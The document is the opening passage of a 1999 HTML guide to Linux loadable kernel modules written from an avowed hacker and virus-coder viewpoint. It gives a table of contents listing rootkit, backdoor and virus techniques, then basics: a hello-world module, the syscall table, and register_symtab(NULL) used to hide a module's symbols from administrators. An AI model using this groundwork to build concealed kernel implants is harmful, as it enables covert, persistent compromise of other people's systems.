<HTML>
    <TITLE>(nearly) Complete Linux Loadable Kernel Modules</title>
    <BODY BGCOLOR=WHITE>
        <CENTER>
            <H1><FONT COLOR=#0000FF>
                (nearly) Complete Linux Loadable Kernel Modules
            </H1></FONT>


        <H4>
            -the definitive guide for hackers, virus coders and system administrators-
        </H4>

    </CENTER>
    <P>
        <H4><FONT COLOR=#FF0000>
            written by pragmatic / THC, version 1.0<br>
            released 03/1999<br>
        </H4></font>

    <P><P><P><P><P><P>

        <CENTER>
            <H3>
                CONTENTS
            </H3>
        </CENTER>


        <A HREF="#Introduction">Introduction</A><BR>
        <P><P>
            <B><U>
                I. Basics<BR>
            </B></U>
            <A HREF="#I.1.">1. What are LKMs</A><BR>
                <A HREF="#I.2.">2. What are Syscalls</A><BR>
                <A HREF="#I.3.">3. What is the Kernel-Symbol-Table</A><BR>
                <A HREF="#I.4.">4. How to transform Kernel to User Space Memory</A><BR>
                <A HREF="#I.5.">5. Ways to use user space like functions</A><BR>
                <A HREF="#I.6.">6. List of daily needed Kernelspace Functions</A><BR>
                <A HREF="#I.7.">7. What is the Kernel-Daemon</A><BR>
                <A HREF="#I.8.">8. Creating your own Devices</A><BR>
                <P><P>
                    <B><U>
                        II. Fun & Profit<BR>
                    </B></U>
                    <A HREF="#II.1.">1. How to intercept Syscalls</A><BR>
                        <A HREF="#II.2.">2. Interesting Syscalls to Intercept</A><BR>
                        <DD><A HREF="#II.2.1.">2.1  Finding interesting systemcalls (the strace approach)</A><BR></DD>
                        <A HREF="#II.3.">3. Confusing the kernel's System Table</A><BR>
                        <A HREF="#II.4.">4. Filesystem related Hacks</A><BR>
                        <DD><A HREF="#II.4.1."> 4.1  How to Hide Files</A><BR></DD>
                        <DD><A HREF="#II.4.2."> 4.2  How to hide the file contents (totally)</A><BR></DD>
                        <DD><A HREF="#II.4.3."> 4.3  How to hide certain file parts (a prototype implementation)</A><BR></DD>
                        <DD><A HREF="#II.4.4."> 4.4  How to monitor redirect file operations</A><BR></DD>
                        <DD><A HREF="#II.4.5."> 4.5  How to avoid any file owner problems</A><BR></DD>
                        <DD><A HREF="#II.4.6."> 4.6  How to make a hacker-tools-directory unaccessible</A><BR></DD>
                        <DD><A HREF="#II.4.7."> 4.7  How to change CHROOT Environments</A><BR></DD>
                        <A HREF="#II.5.">5. Process related Hacks</A><BR>
                        <DD><A HREF="#II.5.1."> 5.1  How to hide any process</A><BR></DD>
                        <DD><A HREF="#II.5.2."> 5.2  How to redirect Execution of files</A><BR></DD>
                        <A HREF="#II.6.">6. Network (Socket) related Hacks</A><BR>
                        <DD><A HREF="#II.6.1."> 6.1  How to controll Socket Operations</A><BR></DD>
                        <A HREF="#II.7.">7. Ways to TTY Hijacking</A><BR>
                        <A HREF="#II.8.">8. Virus writing with LKMs</A><BR>
                        <DD><A HREF="#II.8.1."> 8.1  How a LKM virus can infect any file (not just modules; prototype)</A><BR></DD>
                        <DD><A HREF="#II.8.2."> 8.2  How can a LKM virus help us to get in</A><BR></DD>
                        <A HREF="#II.9.">9. Making our LKM invisible & unremovable</A><BR>
                        <A HREF="#II.10.">10.Other ways of abusing the Kerneldaemon</A><BR>
                        <A HREF="#II.11.">11.How to check for presents of our LKM</A><BR>
                        <P><P>
                            <B><U>
                                III. Soltutions (for admins)<BR>
                            </B></U>
                            <A HREF="#III.1.">1. LKM Detector Theory & Ideas</A><BR>
                                <DD><A HREF="#III.1.1.">1.1  Practical Example of a prototype Detector</A><BR></DD>
                                <DD><A HREF="#III.1.2.">1.2  Practical Example of a prototype password protected create_module(...)</A><BR></DD>
                                <A HREF="#III.2.">2. Anti-LKM-Infector ideas</A><BR>
                                <A HREF="#III.3.">3 Make your programs untraceable (theory)</A><BR>
                                <DD><A HREF="#III.3.1.">3.1  Practical Example of a prototype Anti-Tracer</A><BR></DD>
                                <A HREF="#III.3.">4. Hardening the Linux Kernel with LKMs</A><BR>
                                <DD><A HREF="#III.4.1."> 4.1  Why should we allow arbitrary programs execution rights?
                                    (route's idea from Phrack implemented as LKM)</A><BR></DD>
                                <DD><A HREF="#III.4.2"> 4.2  The Link Patch
                                    (Solar Designer's idea from Phrack implemented as LKM)</A><BR></DD>
                                <DD><A HREF="#III.4.3."> 4.3  The /proc permission patch
                                    (route's idea from Phrack implemented as LKM)</A><BR></DD>
                                <DD><A HREF="#III.4.4."> 4.4  The securelevel patch
                                    (route's idea from Phrack implemented as LKM)</A><BR></DD>
                                <DD><A HREF="#III.4.5."> 4.5  The rawdisk patch</A><BR></DD>
                                <P><P>
                                    <B><U>
                                        IV. Some Better Ideas (for hackers)<BR>
                                    </B></U>
                                    <A HREF="#IV.1.">1. Tricks to beat admin LKMs</A><BR>
                                        <A HREF="#IV.2.">2. Patching the whole kernel - or creating the Hacker-OS</A><BR>
                                        <DD><A HREF="#IV.2.1."> 2.1  How to find kernel symbols in /dev/kmem</A><BR></DD>
                                        <DD><A HREF="#IV.2.2."> 2.2  The new 'insmod' working without kernel support</A><BR></DD>
                                        <A HREF="#IV.3.">3. Last words</A><BR>
                                        <P><P>
                                            <B><U>
                                                V. The near future : Kernel 2.2<BR>
                                            </B></U>
                                            <A HREF="#V.1.">1. Main Difference for LKM writer's</A><BR>
                                                <P><P>
                                                    <B><U>
                                                        VI. Last Words<BR>
                                                    </B></U>
                                                    <A HREF="#VI.1.">1. The 'LKM story' or 'how to make a system plug & hack compatible'</A><BR>
                                                        <A HREF="#VI.2.">2. Links to other Resources</A><BR>
                                                        <P><P>
                                                            <A HREF="#Acknowledgements">Acknowledgements</A><BR>
                                                            <P><P>
                                                                <A HREF="#Greets">Greets</A><BR>
                                                                <P><P><P><P>
                                                                    <B><U>
                                                                        Appendix<BR>
                                                                    </B></U>
                                                                    <P><P>
                                                                        <B><U>
                                                                            A - Source Codes<BR>
                                                                        </B></U>

                                                                        <DD><A HREF="#A-a">a) LKM Infection <I>by Stealthf0rk/SVAT</I></A><BR></DD>
                                                                        <DD><A HREF="#A-b">b) Heroin - the classic one <I>by Runar Jensen</I></A><BR></DD>
                                                                        <DD><A HREF="#A-c">c) LKM Hider / Socket Backdoor <I>by plaguez</I></A><BR></DD>
                                                                        <DD><A HREF="#A-d">d) LKM TTY hijacking <I>by halflife</I></A><BR></DD>
                                                                        <DD><A HREF="#A-e">e) AFHRM - the monitor tool <I>by Michal Zalewski</I></A><BR></DD>
                                                                        <DD><A HREF="#A-f">f) CHROOT module trick <I>by FLoW/HISPAHACK</I></A><BR></DD>
                                                                        <DD><A HREF="#A-g">g) Kernel Memory Patching <I>by ?</I></A><BR></DD>
                                                                        <DD><A HREF="#A-h">h) Module insertion without native support <I>by Silvio Cesare</I></A><BR></DD>

                                                                        <P><P><P><P>
                                                                            <HR SIZE="3" WIDTH="300" ALIGN="CENTER" NOSHADE="NOSHADE">
                                                                                <P><P><P><P>

                                                                                    <P>
                                                                                        <H3><A NAME="Introduction"></A>Introduction</H3>
                                                                                        <P>

                                                                                            The use of Linux in server environments is growing from second to second. So
                                                                                            hacking Linux becomes more interesting every day. One of the best techniques to
                                                                                            attack a Linux system is using kernel code. Due to its feature called Loadable
                                                                                            Kernel Modules (LKMs) it is possible to write code running in kernel space, which
                                                                                            allows us to access very sensitive parts of the OS. There were some texts and
                                                                                            files concerning LKM hacking before (Phrack, for example) which were very good.
                                                                                            They introduced new ideas, new methodes and complete LKMs doing anything a
                                                                                            hacker ever dreamed of. Also some public discussion (Newsgroups, Mailinglists)
                                                                                            in 1998 were very interesting.<BR>
                                                                                            So why do I write again a text about LKMs. Well there are several reasons :
                                                                                            <ul>
                                                                                                <li> former texts did sometimes not give good explanations for kernel beginners;
                                                                                                    this text has a very big basic section, helping beginners to understand the
                                                                                                    concepts. I met lots of people using nice exploits/sniffers and so on without
                                                                                                    even understanding how they work. I included lots of source code in this file
                                                                                                    with lots of comments, just to help those beginners who know that hacking is
                                                                                                    more than playing havoc on some networks out there !<br>
                                                                                                        <li> every published text concentrated on a special subject, there was no complete
                                                                                                            guide for hackers concerning LKMs. This text will cover nearly every aspect of
                                                                                                            kernel abusing (even virus aspects)<br>
                                                                                                                <li> this texts was written from the hacker / virus coder perspective, but it will
                                                                                                                    also help admins and normal kernel developers doing a better job<br>
                                                                                                                        <li> former text showed us the main advantages / methods of abusing LKMs, but
                                                                                                                            there are some things which we have not heard of yet. This text will show
                                                                                                                            some new ideas (nothing totally new, but things which could help us)<br>
                                                                                                                                <li> this text will show concepts of some simple ways to protect from LKM attacks<br>
                                                                                                                                    <li> this text will also show how to defeat LKM protections by using methods like
                                                                                                                                        Runtime Kernel Patching<br>
                                                                                            </ul>

                                                                                            Please remember that new ideas are implemented as prototype modules (just for
                                                                                            demonstration) which have to be improved in order to use them in the wild.<br>
                                                                                            The main motivation of this text is giving everyone <i>one</i> big text covering the
                                                                                            whole LKM problem. In appendix A I give you some existing LKMs plus a short
                                                                                            description of their working (for beginners) and ways to use them. <br>
                                                                                            The whole text (except part V) is based on a Linux 2.0.x machine (x86).I tested
                                                                                            all programs and code fragments. The Linux system must have LKM support for
                                                                                            using most code examples in this text.  Only part  IV  will show some sources
                                                                                            working without native LKM support. Most ideas in this text will also work on
                                                                                            2.2.x systems (perhaps you'll need some minor modification); but recall that
                                                                                            kernel 2.2.x was just released (1/99) and most linux distribution still use
                                                                                            2.0.x (Redhat, SuSE, Caldera, ...). In April some some distributors like SuSE
                                                                                            will present their kernel 2.2.x versions; so you won't need to know how to hack
                                                                                            a 2.2.x kernel at the moment. Good administrators will also wait some months
                                                                                            in order to get a more reliable 2.2.x kernel. [Note : Most systems just don't
                                                                                            need kernel 2.2.x so they will continue using 2.0.x].<br>
                                                                                            This text has a special section dealing with LKMs helping admins to secure the
                                                                                            system. You (hacker) should also read this section, you <i>must</i> know everything
                                                                                            the admins know and even more. You will also get some nice ideas from that
                                                                                            section that could help you develope more advanced 'hacker-LKMs'. Just read the
                                                                                            whole text !<br>
                                                                                            <I><u>And please remember</I></u> : This text was only written for educational purpose. Any
                                                                                            illegal action based on this text is your own problem.<br>


                                                                                            <u><b>
                                                                                                <H2>I. Basics</H2>
                                                                                            </u></b>
                                                                                            <P><P>
                                                                                                <H3><A NAME="I.1."></A>1. What are LKMs</H3>


                                                                                                LKMs are Loadable Kernel Modules used by the Linux kernel to expand his
                                                                                                functionality. The advantage of those LKMs : <i>The can be loaded dynamically</i>;
                                                                                                there must be no recompilation of the whole kernel. Because of those features
                                                                                                they are often used for specific device drivers (or filesystems) such as
                                                                                                soundcards etc.<br>
                                                                                                Every LKM consist of two basic functions (minimum) :
                                                                                                <XMP>
                                                                                                    int init_module(void) /*used for all initialition stuff*/
                                                                                                    {

                                                                                                        ...
                                                                                                    }

                                                                                                    void cleanup_module(void) /*used for a clean shutdown*/
                                                                                                    {
                                                                                                        ...
                                                                                                    }
                                                                                                </XMP>

                                                                                                Loading a module - normally retricted to root - is managed by issuing the
                                                                                                follwing command:

                                                                                                <xmp>
                                                                                                    # insmod module.o
                                                                                                </xmp>

                                                                                                This command forces the System to do the following things :
                                                                                                <ul>
                                                                                                    <li>Load the objectfile (here module.o)<br>
                                                                                                        <li>call create_module systemcall (for systemcalls -> see I.2) for Relocation of
                                                                                                            memory<br>
                                                                                                                <li>unresolved references are resolved by Kernel-Symbols with the systemcall
                                                                                                                    get_kernel_syms<br>
                                                                                                                        <li>after this the init_module systemcall is used for the LKM initialisation
                                                                                                                            -> executing int init_module(void) etc.<br>
                                                                                                </ul>
                                                                                                The Kernel-Symbols are explained in I.3 (Kernel-Symbol-Table).<br>
                                                                                                So I think we can write our first little LKM just showing how it basicly works:

                                                                                                <xmp>
                                                                                                    #define MODULE
                                                                                                    #include <Linux/module.h>

                                                                                                    int init_module(void)
                                                                                                    {
                                                                                                        printk("<1>Hello World\n");
                                                                                                        return 0;
                                                                                                    }

                                                                                                    void cleanup_module(void)
                                                                                                    {
                                                                                                        printk("<1>Bye, Bye");
                                                                                                    }
                                                                                                </xmp>

                                                                                                You may wonder why I used printk(...) not printf(...). Well <i>Kernel-Programming</i>
                                                                                                is totally different from <i>Userspace-Programming</i> !<br>
                                                                                                You only have a very restricted set of commands (see I.6). With those commands
                                                                                                you cannot do much, so you will learn how to use lots of functions you know from
                                                                                                your userspace applications helping you hacking the kernel. Just be patient, we
                                                                                                have to do something else before...<br>
                                                                                                The Example above can easily compiled by

                                                                                                <xmp>
                                                                                                    # gcc -c -O3 helloworld.c
                                                                                                    # insmod helloworld.o
                                                                                                </xmp>

                                                                                                Ok, our module is loaded and showed us the famous text. Now you can check some
                                                                                                commands showing you that your LKM really stays in kernel space.<br>

                                                                                                <xmp>
                                                                                                    # lsmod
                                                                                                    Module         Pages    Used by
                                                                                                    helloworld         1        0
                                                                                                </xmp>

                                                                                                This command reads the information in /proc/modules for showing you which
                                                                                                modules are loaded at the moment. 'Pages' is the memory information (how many
                                                                                                pages does this module fill); the 'Used by' field tells us how often the module
                                                                                                is used in the System (reference count). The module can only be removed, when
                                                                                                this counter is zero; after checking this, you can remove your module with

                                                                                                <xmp>
                                                                                                    # rmmod helloworld
                                                                                                </xmp>

                                                                                                Ok, this was our first little (very little) step towards abusing LKMs. I always
                                                                                                compared those LKMs to old DOS TSR Programs (yes there are many differences,
                                                                                                I know), they were our gate to staying resident in memory and catching every
                                                                                                interrupt we wanted. Microsoft's WIN 9x has something called VxD, which is
                                                                                                also  similar to LKMs (also many differences). The most interesting part of
                                                                                                those resident programs is the ability to hook system functions, in the Linux
                                                                                                world called systemcalls.<br>


                                                                                                <H3><A NAME="I.2."></A>2. What are systemcalls</h3>

                                                                                                I hope you know, that every OS has some functions build into its kernel, which
                                                                                                are used for every operation on that system.<br>
                                                                                                The functions Linux uses are called systemcalls. They represent a transition
                                                                                                from user to kernel space. Opening a file in user space is represented by the
                                                                                                sys_open systemcall in kernel space. For a complete list of all systemcalls
                                                                                                available on your System look at /usr/include/sys/syscall.h. The following list
                                                                                                shows my syscall.h

                                                                                                <xmp>
                                                                                                    #ifndef  _SYS_SYSCALL_H
                                                                                                    #define  _SYS_SYSCALL_H

                                                                                                    #define  SYS_setup    0 /* Used only by init, to get system going. */
                                                                                                    #define SYS_exit    1
                                                                                                    #define SYS_fork    2
                                                                                                    #define SYS_read    3
                                                                                                    #define SYS_write    4
                                                                                                    #define SYS_open    5
                                                                                                    #define SYS_close    6
                                                                                                    #define SYS_waitpid    7
                                                                                                    #define SYS_creat    8
                                                                                                    #define SYS_link    9
                                                                                                    #define SYS_unlink    10
                                                                                                    #define SYS_execve    11
                                                                                                    #define SYS_chdir    12
                                                                                                    #define SYS_time    13
                                                                                                    #define SYS_prev_mknod    14
                                                                                                    #define SYS_chmod    15
                                                                                                    #define SYS_chown    16
                                                                                                    #define SYS_break    17
                                                                                                    #define SYS_oldstat    18
                                                                                                    #define SYS_lseek    19
                                                                                                    #define SYS_getpid    20
                                                                                                    #define SYS_mount    21
                                                                                                    #define SYS_umount    22
                                                                                                    #define SYS_setuid    23
                                                                                                    #define SYS_getuid    24
                                                                                                    #define SYS_stime    25
                                                                                                    #define SYS_ptrace    26
                                                                                                    #define SYS_alarm    27
                                                                                                    #define SYS_oldfstat    28
                                                                                                    #define SYS_pause    29
                                                                                                    #define SYS_utime    30
                                                                                                    #define SYS_stty    31
                                                                                                    #define SYS_gtty    32
                                                                                                    #define SYS_access    33
                                                                                                    #define SYS_nice    34
                                                                                                    #define SYS_ftime    35
                                                                                                    #define SYS_sync    36
                                                                                                    #define SYS_kill    37
                                                                                                    #define SYS_rename    38
                                                                                                    #define SYS_mkdir    39
                                                                                                    #define SYS_rmdir    40
                                                                                                    #define SYS_dup      41
                                                                                                    #define SYS_pipe    42
                                                                                                    #define SYS_times    43
                                                                                                    #define SYS_prof    44
                                                                                                    #define SYS_brk      45
                                                                                                    #define SYS_setgid    46
                                                                                                    #define SYS_getgid    47
                                                                                                    #define SYS_signal    48
                                                                                                    #define SYS_geteuid    49
                                                                                                    #define SYS_getegid    50
                                                                                                    #define SYS_acct    51
                                                                                                    #define SYS_phys    52
                                                                                                    #define SYS_lock    53
                                                                                                    #define SYS_ioctl    54
                                                                                                    #define SYS_fcntl    55
                                                                                                    #define SYS_mpx      56
                                                                                                    #define SYS_setpgid    57
                                                                                                    #define SYS_ulimit    58
                                                                                                    #define SYS_oldolduname    59
                                                                                                    #define SYS_umask    60
                                                                                                    #define SYS_chroot    61
                                                                                                    #define SYS_prev_ustat    62
                                                                                                    #define SYS_dup2    63
                                                                                                    #define SYS_getppid    64
                                                                                                    #define SYS_getpgrp    65
                                                                                                    #define SYS_setsid    66
                                                                                                    #define SYS_sigaction    67
                                                                                                    #define SYS_siggetmask    68
                                                                                                    #define SYS_sigsetmask    69
                                                                                                    #define SYS_setreuid    70
                                                                                                    #define SYS_setregid    71
                                                                                                    #define SYS_sigsuspend    72
                                                                                                    #define SYS_sigpending    73
                                                                                                    #define SYS_sethostname    74
                                                                                                    #define SYS_setrlimit    75
                                                                                                    #define SYS_getrlimit    76
                                                                                                    #define SYS_getrusage    77
                                                                                                    #define SYS_gettimeofday  78
                                                                                                    #define SYS_settimeofday  79
                                                                                                    #define SYS_getgroups    80
                                                                                                    #define SYS_setgroups    81
                                                                                                    #define SYS_select    82
                                                                                                    #define SYS_symlink    83
                                                                                                    #define SYS_oldlstat    84
                                                                                                    #define SYS_readlink    85
                                                                                                    #define SYS_uselib    86
                                                                                                    #define SYS_swapon    87
                                                                                                    #define SYS_reboot    88
                                                                                                    #define SYS_readdir    89
                                                                                                    #define SYS_mmap    90
                                                                                                    #define SYS_munmap    91
                                                                                                    #define SYS_truncate    92
                                                                                                    #define SYS_ftruncate    93
                                                                                                    #define SYS_fchmod    94
                                                                                                    #define SYS_fchown    95
                                                                                                    #define SYS_getpriority    96
                                                                                                    #define SYS_setpriority    97
                                                                                                    #define SYS_profil    98
                                                                                                    #define SYS_statfs    99
                                                                                                    #define SYS_fstatfs    100
                                                                                                    #define SYS_ioperm    101
                                                                                                    #define SYS_socketcall    102
                                                                                                    #define SYS_klog    103
                                                                                                    #define SYS_setitimer    104
                                                                                                    #define SYS_getitimer    105
                                                                                                    #define SYS_prev_stat    106
                                                                                                    #define SYS_prev_lstat    107
                                                                                                    #define SYS_prev_fstat    108
                                                                                                    #define SYS_olduname    109
                                                                                                    #define SYS_iopl    110
                                                                                                    #define SYS_vhangup    111
                                                                                                    #define SYS_idle    112
                                                                                                    #define SYS_vm86old    113
                                                                                                    #define SYS_wait4    114
                                                                                                    #define SYS_swapoff    115
                                                                                                    #define SYS_sysinfo    116
                                                                                                    #define SYS_ipc      117
                                                                                                    #define SYS_fsync    118
                                                                                                    #define SYS_sigreturn    119
                                                                                                    #define SYS_clone    120
                                                                                                    #define SYS_setdomainname  121
                                                                                                    #define SYS_uname    122
                                                                                                    #define SYS_modify_ldt    123
                                                                                                    #define SYS_adjtimex    124
                                                                                                    #define SYS_mprotect    125
                                                                                                    #define SYS_sigprocmask    126
                                                                                                    #define SYS_create_module  127
                                                                                                    #define SYS_init_module    128
                                                                                                    #define SYS_delete_module  129
                                                                                                    #define SYS_get_kernel_syms  130
                                                                                                    #define SYS_quotactl    131
                                                                                                    #define SYS_getpgid    132
                                                                                                    #define SYS_fchdir    133
                                                                                                    #define SYS_bdflush    134
                                                                                                    #define SYS_sysfs    135
                                                                                                    #define SYS_personality    136
                                                                                                    #define SYS_afs_syscall    137 /* Syscall for Andrew File System */
                                                                                                    #define  SYS_setfsuid    138
                                                                                                    #define  SYS_setfsgid    139
                                                                                                    #define  SYS__llseek    140
                                                                                                    #define SYS_getdents    141
                                                                                                    #define SYS__newselect    142
                                                                                                    #define SYS_flock    143
                                                                                                    #define SYS_syscall_flock  SYS_flock
                                                                                                    #define SYS_msync    144
                                                                                                    #define SYS_readv    145
                                                                                                    #define SYS_syscall_readv  SYS_readv
                                                                                                    #define SYS_writev    146
                                                                                                    #define SYS_syscall_writev  SYS_writev
                                                                                                    #define SYS_getsid    147
                                                                                                    #define SYS_fdatasync    148
                                                                                                    #define SYS__sysctl    149
                                                                                                    #define SYS_mlock    150
                                                                                                    #define SYS_munlock    151
                                                                                                    #define SYS_mlockall    152
                                                                                                    #define SYS_munlockall    153
                                                                                                    #define SYS_sched_setparam  154
                                                                                                    #define SYS_sched_getparam  155
                                                                                                    #define SYS_sched_setscheduler  156
                                                                                                    #define SYS_sched_getscheduler  157
                                                                                                    #define SYS_sched_yield    158
                                                                                                    #define SYS_sched_get_priority_max  159
                                                                                                    #define SYS_sched_get_priority_min  160
                                                                                                    #define SYS_sched_rr_get_interval  161
                                                                                                    #define SYS_nanosleep    162
                                                                                                    #define SYS_mremap    163
                                                                                                    #define SYS_setresuid    164
                                                                                                    #define SYS_getresuid    165
                                                                                                    #define SYS_vm86    166
                                                                                                    #define SYS_query_module  167
                                                                                                    #define SYS_poll    168
                                                                                                    #define SYS_syscall_poll  SYS_poll

                                                                                                    #endif  /* <sys/syscall.h> */
                                                                                                </xmp>

                                                                                                Every systemcall has a defined number (see listing above), which is actually
                                                                                                used to make the systemcall.<br>
                                                                                                The Kernel uses interrupt 0x80 for managing every systemcall.  The systemcall
                                                                                                number and any arguments are moved to some registers (eax for systemcall number,
                                                                                                for example).<br>
                                                                                                The systemcall number is an index in an array of a kernel structure called
                                                                                                sys_call_table[]. This structure maps the systemcall numbers to the needed
                                                                                                service function.<br>
                                                                                                Ok, this should be enough knowledge to continue reading. The following table
                                                                                                lists the most interesting systemcalls plus a short description.
                                                                                                Believe me, you have to know the exact working of those systemcalls in order to
                                                                                                make really useful LKMs.<br>

                                                                                                <TABLE border=5 width=100%>
                                                                                                <tr>

                                                                                                    <th>systemcall</th>
                                                                                                    <th>description</th>


                                                                                                    <tr>
                                                                                                        <td>int sys_brk(unsigned long new_brk);</td>
                                                                                                        <td>changes the size of used DS (data segment)
                                                                                                            ->this systemcall will be discussed in I.4</td>
                                                                                                    </tr>


                                                                                                    <tr>
                                                                                                        <td>int sys_fork(struct pt_regs regs);</td>
                                                                                                        <td>systemcall for the well-know fork() function in user space</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_getuid
                                                                                                            ()<br>
                                                                                                                int sys_setuid
                                                                                                                (uid_t uid)<br>
                                                                                                                ...</td>
                                                                                                        <td>systemcalls for managing UID etc.</td>
                                                                                                    </tr>



                                                                                                    <tr>
                                                                                                        <td>int sys_get_kernel_sysms(struct kernel_sym *table)</td>
                                                                                                        <td>systemcall for accessing the kernel system table (-> I.3)</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_sethostname
                                                                                                            (char *name,
                                                                                                            int len);<br>
                                                                                                                int sys_gethostname
                                                                                                                (char *name,
                                                                                                                int len);<br></td>
                                                                                                        <td>sys_sethostname is responsible for setting the hostname, and sys_gethostname for retrieving
                                                                                                            it</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_chdir
                                                                                                            (const char *path);<br>
                                                                                                                int sys_fchdir
                                                                                                                (unsigned int fd);<br></td>
                                                                                                        <td>both function are used for setting the current directory (cd ...)</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_chmod
                                                                                                            (const char
                                                                                                            *filename, mode_t
                                                                                                            mode);<br>
                                                                                                                int sys_chown
                                                                                                                (const char
                                                                                                                *filename, mode_t
                                                                                                                mode);<br>
                                                                                                                int sys_fchmod
                                                                                                                (unsigned int
                                                                                                                fildes, mode_t
                                                                                                                mode);<br>
                                                                                                                int sys_fchown
                                                                                                                (unsigned int
                                                                                                                fildes, mode_t
                                                                                                                mode);<br></td>
                                                                                                        <td>functions for managing permissions and so on</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_chroot
                                                                                                            (const char
                                                                                                            *filename);</td>
                                                                                                        <td>sets root directory for calling process</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_execve
                                                                                                            (struct pt_regs regs);</td>
                                                                                                        <td>important systemcall -> it is responsible for executing file (pt_regs is the register stack)</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>long sys_fcntl
                                                                                                            (unsigned int fd,
                                                                                                            unsigned int cmd,
                                                                                                            unsigned long arg);</td>
                                                                                                        <td>changing characteristics of fd (opened file descr.)</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_link
                                                                                                            (const char *oldname,
                                                                                                            const char *newname);<br>
                                                                                                                int sym_link
                                                                                                                (const char *oldname,
                                                                                                                const char *newname);<br>
                                                                                                                int sys_unlink
                                                                                                                (const char *name);<br></td>
                                                                                                        <td>systemcalls for hard- / softlinks management</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_rename
                                                                                                            (const char *oldname,
                                                                                                            const char *newname);</td>
                                                                                                        <td>file renaming</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_rmdir
                                                                                                            (const char* name);<br>
                                                                                                                int sys_mkdir
                                                                                                                (const *char filename,
                                                                                                                int mode);<br></td>
                                                                                                        <td>creating & removing directories</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_open
                                                                                                            (const char *filename,
                                                                                                            int mode);<br>
                                                                                                                int sys_close
                                                                                                                (unsigned int fd);<br></td>
                                                                                                        <td>everything concering opening files (also creation), and also closing them</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_read
                                                                                                            (unsigned int fd,
                                                                                                            char *buf, unsigned int
                                                                                                            count);<br>
                                                                                                                int sys_write
                                                                                                                (unsigned int fd,
                                                                                                                char *buf, unsigned int
                                                                                                                count);<br></td>
                                                                                                        <td>systemcalls for writing & reading from Files</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_getdents
                                                                                                            (unsigned int fd,
                                                                                                            struct dirent *dirent,
                                                                                                            unsigned int count);</td>
                                                                                                        <td>systemcall which retrievs file listing (ls ... command)  </td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_readlink
                                                                                                            (const char *path,
                                                                                                            char *buf, int bufsize);</td>
                                                                                                        <td>reading symbolic links</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>int sys_selectt
                                                                                                            (int n, fd_set *inp,
                                                                                                            fd_set *outp, fd_set
                                                                                                            *exp, struct timeval
                                                                                                            *tvp);</td>
                                                                                                        <td>multiplexing of I/O operations</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>sys_socketcall
                                                                                                            (int call, unsigned long
                                                                                                            args);</td>
                                                                                                        <td>socket functions</td>
                                                                                                    </tr>

                                                                                                    <tr>
                                                                                                        <td>unsigned long
                                                                                                            sys_create_module
                                                                                                            (char *name, unsigned
                                                                                                            long size);<br>
                                                                                                                int sys_delete_module
                                                                                                                (char *name);<br>
                                                                                                                int sys_query_module
                                                                                                                (const char *name,
                                                                                                                int which,
                                                                                                                void *buf,
                                                                                                                size_t bufsize,
                                                                                                                size_t *ret);<br></td>
                                                                                                        <td>used for loading / unloading LKMs and querying</td>
                                                                                                    </tr>
                                                                                                </table>

                                                                                                    In my opinion these are the most interesting systemcalls for any hacking
                                                                                                    intention, of course it is possible that you may need something special on your
                                                                                                    rooted system, but the average hacker has a plenty of possibilities with the
                                                                                                    listing above. In part II you will learn how to use the systemcalls for your
                                                                                                    profit.


                                                                                                <H3><A NAME="I.3."></A>3. What is the Kernel-Symbol-Table</h3>

                                                                                                    Ok, we understand the basic concept of systemcalls and modules. But there is
                                                                                                    another very important point we need to understand - the Kernel Symbol Table.
                                                                                                    Take a look at /proc/ksyms. Every entry in this file represents an exported
                                                                                                    (public) Kernel Symbol, which can be accessed by our LKM. Take a deep look
                                                                                                    in that file, you will find many interesting things in it. <br>
                                                                                                    This file is really very interesting, and can help us to see what our LKM can
                                                                                                    get; but there is one problem. Every Symbol used in our LKM (like a function) is
                                                                                                    also exportet to the public, and is also listed in that file. So an experienced
                                                                                                    admin could discover our little LKM and kill it.<br>
                                                                                                    There are lots of methods to prevent the admin from seeing our LKM, look at
                                                                                                    section II.<br>
                                                                                                    The methods mentioned in II can be called 'Hacks', but when you take a look at
                                                                                                    the contents of section II you won't find any reference to 'Keeping LKM Symbols
                                                                                                    out of /proc/ksyms'. The reason for not mentioning this problem in II is the
                                                                                                    following :<br>
                                                                                                    you won't need a trick to keep your module symbols away from /proc/ksyms.
                                                                                                    LKM devolopers are able to use the following piece of regular code to limit the
                                                                                                    exported symbols of their module:<br>

                                                                                                    <xmp>
                                                                                                        static struct symbol_table module_syms= { /*we define our own symbol table !*/
                                                                                                        #include <linux/symtab_begin.h>          /*symbols we want to export, do we ?*/
                                                                                                        ...
                                                                                                    };

                                                                                                        register_symtab(&module_syms);            /*do the actual registration*/
                                                                                                    </xmp>

                                                                                                    As I said, we don't want to export any symbols to the public, so we use the
                                                                                                    following construction :

                                                                                                    <xmp>
                                                                                                        register_symtab(NULL);
                                                                                                    </xmp>

                                                                                                    This line must be inserted in the init_module() function, remember this !


                                                                                                    <H3><A NAME="I.4."></A>4. How to transform Kernel to User Space Memory </h3>

                                                                                                    Till now this essay was very very basic and easy. Now we come to stuff
                                                                                                    more difficult (but not more advanced).<br>
                                                                                                    We have many advantages because of coding in kernel space, but we also have some
                                                                                                    disadvantages. systemcalls get their arguments from user space (systemcalls are
                                                                                                    implemented in wrappers like libc), but our LKM runs in kernel space. In section
                                                                                                    II you will see that it is very important for us to check the arguments of
                                                                                                    certain systemcalls in order to act the right way. But how can we access an
                                                                                                    argument allocated in user space from our kernel space module ?
                                                                                                    <br><i>Solution</i> : We have to make a <i>transition</i>.<br>
